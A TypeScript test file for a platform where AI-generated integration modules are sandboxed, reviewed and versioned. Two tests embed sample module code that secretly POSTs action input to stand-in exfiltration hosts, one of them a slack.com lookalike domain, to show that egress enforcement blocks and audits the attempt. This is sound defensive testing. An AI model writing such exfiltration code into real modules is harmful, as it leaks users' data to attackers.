import { readFile } from 'node:fs/promises';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { MockProvider } from '../src/ai/provider.js';
import { buildServer } from '../src/api/server.js';
import { approveExampleModules, approvedReleaseFlow, giveAllCredentials, makeWorld, releaseInputs, runStatus, type World } from './helpers.js';

const ai = new MockProvider();
let w: World;
let server: ReturnType<typeof buildServer>;
beforeAll(async () => {
  w = await makeWorld({}, { ai });
  server = buildServer(w.app);
});
afterAll(async () => {
  await server.close();
  await w.db.end();
});

const auth = (token: string) => ({ authorization: `Bearer ${token}` });
const dir = path.resolve(import.meta.dirname, 'fixtures', 'modules', 'slack');

async function slackResponse(code?: string) {
  return {
    manifestJson: await readFile(path.join(dir, 'manifest.json'), 'utf8'),
    code: code ?? (await readFile(path.join(dir, 'module.mjs'), 'utf8')),
    testsJson: await readFile(path.join(dir, 'tests.json'), 'utf8'),
  };
}

describe('modules generated through chat', () => {
  it('drafts a module from a request, validates it in the sandbox, and shows the admin a plain summary', async () => {
    ai.enqueue(await slackResponse());
    const res = await server.inject({
      method: 'POST',
      url: '/api/modules/generate',
      headers: auth(w.tokens.alice),
      payload: { request: 'Post release notes to a Slack channel' },
    });
    expect(res.statusCode).toBe(201);
    const review = res.json();
    expect(review.status).toBe('draft');
    expect(review.origin).toBe('chat');
    expect(review.validationReport.passed).toBe(true);
    expect(review.summary).toContain('It can only connect to: slack.com.');
    expect(review.summary).toContain('Post a message (post_message): CHANGES data.');
    expect(ai.requests[0]!.prompt).toContain('Post release notes to a Slack channel');

    expect((await server.inject({ method: 'POST', url: `/api/modules/${review.id}/submit`, headers: auth(w.tokens.alice) })).statusCode).toBe(204);
    const decided = await server.inject({
      method: 'POST',
      url: `/api/modules/${review.id}/decision`,
      headers: auth(w.tokens.admin),
      payload: { decision: 'approved' },
    });
    expect(decided.statusCode).toBe(204);
  });

  it('a generated module that reaches for an undeclared host fails its sandbox tests and cannot be submitted', async () => {
    const evil = `export const actions = { async post_message(input, ctx) {
      await ctx.http.request({ method: 'POST', url: 'https://collector.example.net/x', json: input });
      return { ts: '1' }; } }`;
    const r = await slackResponse(evil);
    ai.enqueue({ ...r, manifestJson: r.manifestJson.replace('"1.0.0"', '"1.0.1"') });
    const res = await server.inject({ method: 'POST', url: '/api/modules/generate', headers: auth(w.tokens.alice), payload: { request: 'slack' } });
    const review = res.json();
    expect(review.validationReport.passed).toBe(false);
    expect(review.validationReport.tests[0]).toMatchObject({ passed: false, errorType: 'egress_denied_host' });
    const submit = await server.inject({ method: 'POST', url: `/api/modules/${review.id}/submit`, headers: auth(w.tokens.alice) });
    expect(submit.json()).toEqual({ error: 'module_validation_failed' });
  });

  it('a manifest that does not parse goes back to the AI with its problems, then fails clearly if still broken', async () => {
    const good = await slackResponse();
    const m = JSON.parse(good.manifestJson);
    // The mistake from the field: a host setting without its pattern.
    const broken = { ...good, manifestJson: JSON.stringify({ ...m, name: 'slack-fixed', settings: [{ id: 'site', type: 'host', label: 'Article site', default: 'news.example.com' }] }) };
    ai.enqueue(broken);
    ai.enqueue({ ...good, manifestJson: JSON.stringify({ ...m, name: 'slack-fixed' }) });
    const res = await server.inject({ method: 'POST', url: '/api/modules/generate', headers: auth(w.tokens.alice), payload: { request: 'Post to Slack', answers: {} } });
    expect(res.statusCode).toBe(201);
    expect(res.json().ref).toBe('slack-fixed@1.0.0');
    expect(ai.requests.at(-1)!.prompt).toContain('The manifest is invalid: settings.0.pattern');

    for (let i = 0; i < 3; i++) ai.enqueue({ ...broken, manifestJson: broken.manifestJson.replace('slack-fixed', 'slack-never') });
    const failed = await server.inject({ method: 'POST', url: '/api/modules/generate', headers: auth(w.tokens.alice), payload: { request: 'Post to Slack', answers: {} } });
    expect(failed.statusCode).toBe(502);
    expect(failed.json().error).toBe('ai_manifest_invalid');
    expect(JSON.stringify(failed.json())).toContain('still incomplete after 3 tries (settings.0.pattern');
  });

  it('a manifest wrapped in another object, or with a too-long description, is taken as meant without a repair round', async () => {
    const good = await slackResponse();
    const m = JSON.parse(good.manifestJson);
    const long = 'Lists pull requests and comments on them. '.repeat(20);
    const { description: _drop, ...inner } = m;
    // The field case: no name, version or actions at the top, and a description over 500 characters beside them.
    ai.enqueue({ ...good, manifestJson: JSON.stringify({ description: long, manifest: { ...inner, name: 'slack-wrapped' } }) });
    const before = ai.requests.length;
    const res = await server.inject({ method: 'POST', url: '/api/modules/generate', headers: auth(w.tokens.alice), payload: { request: 'Post to Slack', answers: {} } });
    expect(res.statusCode, res.body).toBe(201);
    expect(res.json().ref).toBe('slack-wrapped@1.0.0');
    expect(ai.requests.length - before).toBe(1);
    const stored = (await w.db.query(`SELECT manifest FROM module_versions WHERE name = 'slack-wrapped'`)).rows[0].manifest;
    expect(stored.description).toHaveLength(500);
    expect(stored.description.endsWith('…')).toBe(true);
  });

  it('the repair note says the manifest must not be wrapped when its top-level fields are missing', async () => {
    const good = await slackResponse();
    const m = JSON.parse(good.manifestJson);
    ai.enqueue({ ...good, manifestJson: JSON.stringify({ description: 'x', parts: [m] }) });
    ai.enqueue({ ...good, manifestJson: JSON.stringify({ ...m, name: 'slack-unwrapped' }) });
    const res = await server.inject({ method: 'POST', url: '/api/modules/generate', headers: auth(w.tokens.alice), payload: { request: 'Post to Slack', answers: {} } });
    expect(res.statusCode, res.body).toBe(201);
    expect(ai.requests.at(-1)!.prompt).toContain('manifestJson must be the manifest object itself');
  });

  it('a revision is a new version; the earlier version is never overwritten', async () => {
    const first = (await w.db.query(`SELECT id FROM module_versions WHERE name = 'slack' ORDER BY created_at LIMIT 1`)).rows[0].id;
    ai.enqueue(await slackResponse());
    const res = await server.inject({
      method: 'POST',
      url: `/api/modules/${first}/revise`,
      headers: auth(w.tokens.alice),
      payload: { feedback: 'Also support thread replies' },
    });
    expect(res.statusCode).toBe(201);
    expect(res.json().ref).toBe('slack@1.0.2');
    expect(ai.requests.at(-1)!.prompt).toContain('Also support thread replies');
  });

  it('"add it to <module>": any member proposes a new version of the newest approved one, keeping its actions', async () => {
    // bob did not build slack; extending it is still only a draft that an admin reviews.
    ai.enqueue(await slackResponse());
    const res = await server.inject({ method: 'POST', url: '/api/modules/by-name/slack/extend', headers: auth(w.tokens.bob), payload: { request: 'An action that lists the replies of a thread' } });
    expect(res.statusCode, res.body).toBe(201);
    expect(res.json()).toMatchObject({ status: 'draft', ref: expect.stringMatching(/^slack@1\.0\.\d+$/) });
    const prompt = ai.requests.at(-1)!.prompt;
    expect(prompt).toContain('Add to this module what a Flow needs: An action that lists the replies of a thread');
    expect(prompt).toContain('Keep every existing action, its name, input and output exactly as they are');
    // Only an approved module can be extended.
    const none = await server.inject({ method: 'POST', url: '/api/modules/by-name/nothing-here/extend', headers: auth(w.tokens.bob), payload: { request: 'x' } });
    expect(none.json()).toEqual({ error: 'module_not_approved' });
  });

  it('without an AI provider, generation reports that clearly', async () => {
    const w2 = await makeWorld({}, { ai: null });
    const s2 = buildServer(w2.app);
    const res = await s2.inject({ method: 'POST', url: '/api/modules/generate', headers: auth(w2.tokens.alice), payload: { request: 'x' } });
    expect(res.json()).toEqual({ error: 'ai_provider_not_configured' });
    await s2.close();
    await w2.db.end();
  });
});

describe('manifest enforcement inside a real run', () => {
  it('a module that tries an undeclared host during a run is blocked and recorded', async () => {
    const w3 = await makeWorld();
    await approveExampleModules(w3);
    await giveAllCredentials(w3, w3.alice);
    const version = await approvedReleaseFlow(w3);
    // Swap the approved code in a way that also bypasses the approval hash would be caught earlier,
    // so exercise the broker path directly with a module whose code is approved but misbehaves:
    const manifest = JSON.parse(await readFile(path.join(dir, 'manifest.json'), 'utf8'));
    manifest.version = '9.0.0';
    const sneaky = `export const actions = { async post_message(input, ctx) {
      await ctx.http.request({ method: 'POST', url: 'https://slack.com.evil.example/x', json: input });
      return { ts: '1' }; } }`;
    const mv = await w3.app.modules.createDraft({ manifest, code: sneaky, tests: [], origin: 'seed' }, w3.alice);
    // Force-approve to prove the runtime, not the review, is what stops it.
    await w3.db.query(`UPDATE module_versions SET status = 'approved' WHERE id = $1`, [mv.id]);
    const def = (await w3.db.query(`SELECT definition FROM flow_versions WHERE id = $1`, [version.id])).rows[0].definition;
    def.steps.find((s: { id: string }) => s.id === 'announce').module = 'slack@9.0.0';
    def.steps = def.steps.filter((s: { id: string }) => !['signoff', 'merge'].includes(s.id));
    const v = await w3.app.flows.create('sneaky', def, w3.alice);
    await w3.app.flows.decide(v.id, w3.approver, 'approved');
    const runId = await w3.app.engine.startRun(v.id, w3.alice.id, releaseInputs);
    await w3.app.worker.drain();
    const run = await runStatus(w3, runId, w3.alice);
    expect(run.steps.at(-1)).toMatchObject({ status: 'failed', errorType: 'egress_denied_host' });
    expect(w3.fake.calls.some((c) => c.url.includes('evil'))).toBe(false);
    const audit = await w3.db.query(`SELECT outcome, error_type FROM audit_events WHERE action = 'module.violation_blocked' AND subject_id = $1`, [mv.id]);
    expect(audit.rows).toEqual([{ outcome: 'denied', error_type: 'egress_denied_host' }]);
    await w3.db.end();
  });
});
